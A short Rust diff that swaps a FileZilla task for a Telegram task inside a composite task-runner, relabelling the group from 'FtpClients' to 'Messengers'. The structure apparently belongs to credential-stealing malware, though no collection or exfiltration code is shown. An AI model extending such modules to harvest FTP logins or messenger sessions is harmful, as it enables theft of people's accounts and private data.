@@ -1,25 +1,26 @@
 #![no_std]
 #![allow(unsafe_op_in_unsafe_fn)]
 
-extern crate alloc;
-mod filezilla;
+mod telegram;
 
-use crate::filezilla::FileZillaTask;
+extern crate alloc;
+
 use alloc::vec;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use crate::telegram::TelegramTask;
 
-pub struct FtpTask {
+pub struct MessengersTask {
     inner: CompositeTask
 }
 
-impl FtpTask {
+impl MessengersTask {
     pub fn new() -> Self {
         Self {
             inner: composite_task!(
-                FileZillaTask
+                TelegramTask
             )
         }
     }
 }
 
-impl_composite_task_runner!(FtpTask, "FtpClients");
+impl_composite_task_runner!(MessengersTask, "Messengers");
